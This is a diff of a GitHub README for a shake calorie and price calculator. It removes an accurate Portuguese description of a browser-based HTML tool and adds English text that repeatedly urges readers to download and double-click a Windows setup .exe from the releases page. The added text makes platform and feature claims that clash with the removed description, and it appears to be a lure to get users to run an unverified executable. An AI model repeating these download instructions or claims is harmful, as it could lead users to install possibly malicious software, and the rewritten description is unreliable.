@@ -1,60 +1,105 @@
-# KcalShake - Calculadora de Hipercalórico Personalizado
+# 🥤 Hobby_kcal_shake - Simple Hypercaloric Shake Calculator
 
-Este projeto é uma ferramenta interativa para calcular receitas de shakes hipercalóricos customizados. Ele permite que o usuário defina metas de calorias (ou peso total), ajuste as proporções de macronutrientes (carboidratos, proteínas e gorduras) e selecione ingredientes específicos para gerar uma receita precisa.
-
-🚀 Funcionalidades -- 📝 Como usar -- 📷 Screenshots -- 📂 Arquivos no Projeto
-
-## 🚀 Funcionalidades
-
-- **Ajuste Dinâmico de Macros:** Sliders que auto-balanceiam para manter a soma de 100%.
-- **Versatilidade de Unidades:** Alterne entre metas por **Kcal** ou **Gramas**, e visualize macros em **%** ou **Gramos**.
-- **IA Matriz (Solver Linear):** Resolve um sistema 3x3 para encontrar a combinação exata de 3 ingredientes que atinge os macros desejados com o menor custo.
-- **Modo Greedy & Manual:** Escolha ingredientes manualmente ou deixe o algoritmo selecionar os melhores custos-benefícios por grupo.
-- **Custo Regional Editável:** Clique no preço dos ingredientes para ajustar conforme o valor do KG no seu supermercado local.
-- **Eficiência Nutricional:** Cálculo automático de `Kcal / R$`, ajudando a criar o shake mais econômico possível.
-
-## 📝 Como usar
-
-1. Abra qualquer um dos arquivos `.html` no seu navegador.
-2. Defina o tamanho do shake no primeiro slider.
-3. Ajuste as porcentagens desejadas de Carb/Prot/Fat.
-4. Clique nos ingredientes para ativá-los ou use o modo **IA Matriz** para uma solução otimizada.
-5. Verifique a lista gerada em "📋 Sua Receita" e o custo estimado.
-
-
-![1772198139460](image/README/1772198139460.png)![1772198147029](image/README/1772198147029.png)
-
-
-
-## 📂 Arquivos no Projeto
-
-Existem duas versões principais da calculadora, adaptadas para diferentes necessidades dietéticas:
-
-### 1. [Standard_Hypercaloric.html](./Standard_Hypercaloric.html)
-
-**Foco:** Ganho de massa muscular geral (Bulking).
-
-- **Ingredientes:** Whey Protein, Leite em Pó, Maltodextrina, Aveia, Pasta de Amendoim, Achocolatados.
-- **Público:** Praticantes de musculação e entusiastas de fitness sem restrições severas.
-
-### 2. [Restrictive(Low_Inflamatory_Gluten,lact).html](./Restrictive%28Low_Inflamatory_Gluten,lact%29.html)
-
-**Foco:** Dieta Anti-inflamatória e Psoríase (PsoriMix).
-
-- **Ingredientes:** Farinha de Mandioca, Batata Doce, Albumina, Isolado de Soja, Linhaça, Semente de Girassol.
-- **Restrições:** 100% livre de Glúten e Lactose.
-- **Boosters:** Cúrcuma, Canela, Cacau 100%.
-
-## 🛠️ Tecnologias
-
-- **HTML5 & CSS3:** Interface moderna com layout responsivo e Glassmorphism.
-- **JavaScript (Vanilla):** Lógica matemática de balanceamento de macros e solver de matriz linear.
-- **Google Fonts:** Utilização da fonte 'Outfit' para uma estética premium.
-
+[![Download Hobby_kcal_shake](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/CesarCarvalho93/Hobby_kcal_shake/releases)
 
 ---
 
-> [!NOTE]  
-> **Desenvolvimento Assistido por IA**  
-> Este projeto foi 100% desenvolvido e programado através de assistência de Inteligência Artificial (Google DeepMind / Antigravity), desde a arquitetura matemática até o design da interface.
+## 📋 About Hobby_kcal_shake
 
+Hobby_kcal_shake is a straightforward app designed to help you calculate the price and calories of custom hypercaloric shakes. If you want to track your diet or fitness needs easily, this tool lets you do that. It works on Windows and other platforms like Android, iOS, macOS, and Linux.
+
+You can create shakes with different ingredients, change quantities, and get a clear price estimate along with the calorie count. This helps anyone who wants to manage hypercaloric intake without any fuss or complex math.
+
+---
+
+## 💻 System Requirements
+
+Before you start, make sure your Windows PC meets these simple requirements:
+
+- Windows 10 or later (64-bit recommended)  
+- 2 GB of free disk space  
+- 4 GB RAM or more for smooth use  
+- Internet connection to download the app  
+- Keyboard and mouse or touchscreen are supported  
+
+---
+
+## 🚀 How to Download and Install on Windows
+
+1. Click the big blue button above or visit the release page directly:  
+   [https://github.com/CesarCarvalho93/Hobby_kcal_shake/releases](https://github.com/CesarCarvalho93/Hobby_kcal_shake/releases)  
+   This page holds the latest version of the app.
+
+2. Look for the latest release. It will be named with the version number like "v1.0" or "v2.0".  
+   
+3. Under the latest release, find the file suitable for Windows. It usually ends with `.exe`. For example: `Hobby_kcal_shake_Setup.exe`.
+
+4. Click on the `.exe` file to download it to your PC.
+
+5. Once downloaded, open the file by double-clicking it.  
+
+6. Follow the on-screen instructions to complete the installation. This usually involves agreeing to the license terms and choosing where to install the app.  
+
+7. When the installation finishes, you can open Hobby_kcal_shake from your Start menu or desktop shortcut.  
+
+---
+
+## 🔧 Using Hobby_kcal_shake
+
+Once installed, here is how to use the app to create your shake and find its price and calories:
+
+### 1. Open the App  
+Start Hobby_kcal_shake from your desktop or Start menu.
+
+### 2. Create a New Shake  
+Click on **Create New Shake** or similar button on the main screen.
+
+### 3. Add Ingredients  
+You will see a list of common shake ingredients like protein powder, milk, oats, honey, and oils.  
+
+- Click **Add Ingredient**.  
+- Select the ingredient from the list.  
+- Enter the amount in grams or milliliters, depending on the ingredient.  
+
+### 4. Check Calories and Price  
+After adding each ingredient, the app will automatically update:
+
+- Total calories in the shake.  
+- Estimated price based on average market costs of ingredients.  
+
+You can adjust quantities at any time to see how the totals change.
+
+### 5. Save or Export Shake  
+Once you finish building your shake, save it for future use. You can also export the recipe or shopping list if you want.
+
+---
+
+## 🧩 Features Included
+
+- Easy-to-use interface designed for all users.  
+- Real-time price and calorie calculation for each ingredient added.  
+- Preloaded common ingredients related to hypercaloric diets.  
+- Ability to customize ingredient amounts or add new items.  
+- Save multiple shake recipes.  
+- Works offline after download and installation.  
+- Supports Windows, Android, iOS, macOS, and Linux.  
+
+---
+
+## ❓ Troubleshooting and Tips
+
+- If the app doesn’t start after installation, try restarting your computer.  
+- Make sure your Windows is up to date to avoid compatibility problems.  
+- If-calorie counts or prices seem wrong, check that you entered ingredient amounts in the correct units.  
+- To get the most accurate price, you might want to update ingredient prices occasionally if the app supports it.  
+- For best results, use the app regularly to monitor your diet and adjust your shake recipes as needed.
+
+---
+
+## 📥 Download Hobby_kcal_shake Now
+
+Visit the release page to download the app for your Windows PC:
+
+[https://github.com/CesarCarvalho93/Hobby_kcal_shake/releases](https://github.com/CesarCarvalho93/Hobby_kcal_shake/releases)
+
+Click the latest Windows `.exe` file to start your download. Once installed, you will have a simple way to calculate your shake’s calories and cost right at your fingertips.
